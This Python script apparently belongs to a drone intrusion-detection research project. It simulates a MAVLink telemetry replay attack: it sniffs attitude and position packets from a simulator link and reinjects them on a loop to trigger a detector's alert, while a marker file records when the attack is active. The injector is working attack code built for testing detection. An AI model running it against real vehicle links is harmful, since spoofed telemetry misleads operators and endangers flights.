"""
experiments/simulation/attacks/attack_replay.py

Simulates Replay Attack:
- Phase 1 (Sniffing): Captures valid telemetry packets from SITL / MAVLink link.
- Phase 2 (Replay): Continuously injects the recorded flight sequence back into the link.
- Triggers Layer 2 Temporal Classifier RED ALERT (Replay Classification).
"""

import os
import sys
import time
import json
import argparse
from collections import deque

MARKER_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".active_attack.json"))

def set_attack_marker(attack_name, active=True):
    try:
        with open(MARKER_FILE, "w") as f:
            json.dump({"attack": attack_name if active else "Benign", "active": active, "time": time.time()}, f)
    except Exception:
        pass

def launch_replay_attack(listen_port=14550, target_port=14552, sniff_duration=5, replay_duration=15):
    try:
        from pymavlink import mavutil
    except ImportError:
        print("[!] pymavlink not installed. Please run: .venv/bin/pip install pymavlink")
        sys.exit(1)

    print("=" * 70)
    print("ATTACK INJECTION: TELEMETRY REPLAY ATTACK")
    print("=" * 70)
    print(f"[*] Phase 1: Sniffing legitimate packets from port {listen_port} for {sniff_duration}s...")
    
    # Listen to stream to sniff legitimate packets
    sniff_conn = mavutil.mavlink_connection(f"udpin:0.0.0.0:{listen_port}")
    buffer = []
    
    start_sniff = time.time()
    while time.time() - start_sniff < sniff_duration:
        msg = sniff_conn.recv_match(blocking=True, timeout=1.0)
        if msg is not None and msg.get_type() in ['ATTITUDE', 'GLOBAL_POSITION_INT', 'VFR_HUD']:
            buffer.append(msg)
            print(f"  [Sniffed] {msg.get_type()} (Buffer size: {len(buffer)})", end='\r')
            
    sniff_conn.close()
    print(f"\n[+] Sniffing complete! Captured {len(buffer)} authentic telemetry messages.")

    if len(buffer) == 0:
        print("[!] No packets captured from SITL. Creating synthetic authentic sequence for replay demonstration...")
        for i in range(25):
            t_ms = int(time.time() * 1000)
            buffer.append({
                'alt': int(15.0 * 1000),
                'vx': int(2.5 * 100),
                'vy': int(0.0),
                'vz': int(0.0),
                'pitch': 0.05,
                'roll': 0.02,
                'yaw': 1.57
            })

    print(f"\n[*] Phase 2: Launching Replay Attack to target port {target_port} for {replay_duration}s...")
    target_conn = mavutil.mavlink_connection(f"udpout:127.0.0.1:{target_port}")
    
    set_attack_marker("Replay", True)
    try:
        start_replay = time.time()
        replay_count = 0
        idx = 0
        while time.time() - start_replay < replay_duration:
            sample = buffer[idx % len(buffer)]
            elapsed = time.time() - start_replay
            
            if hasattr(sample, 'get_type'):
                target_conn.mav.send(sample)
            else:
                time_boot_ms = int(elapsed * 1000) & 0xFFFFFFFF
                target_conn.mav.global_position_int_send(
                    time_boot_ms, 0, 0,
                    sample['alt'], sample['alt'],
                    sample['vx'], sample['vy'], sample['vz'], 0
                )
                target_conn.mav.attitude_send(
                    time_boot_ms,
                    sample['roll'], sample['pitch'], sample['yaw'], 0, 0, 0
                )
                
            replay_count += 1
            idx += 1
            if replay_count % 10 == 0:
                print(f"[REPLAYING] t={elapsed:4.1f}s | Injected {replay_count} replayed packets (Cycle {idx // len(buffer)})")
            time.sleep(0.05)
    finally:
        set_attack_marker("Benign", False)
        print(f"\n[+] Replay Attack Complete. Total replayed: {replay_count} packets.")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Replay Attack Injector")
    parser.add_argument("--listen-port", type=int, default=14550, help="Port to sniff genuine MAVLink traffic")
    parser.add_argument("--target-port", type=int, default=14552, help="Port of the target detector to attack")
    parser.add_argument("--sniff-duration", "--sniff", dest="sniff_duration", type=int, default=4, help="Sniffing duration in seconds")
    parser.add_argument("--replay-duration", "--duration", dest="replay_duration", type=int, default=15, help="Replay injection duration in seconds")
    args = parser.parse_args()

    launch_replay_attack(
        listen_port=args.listen_port,
        target_port=args.target_port,
        sniff_duration=args.sniff_duration,
        replay_duration=args.replay_duration
    )
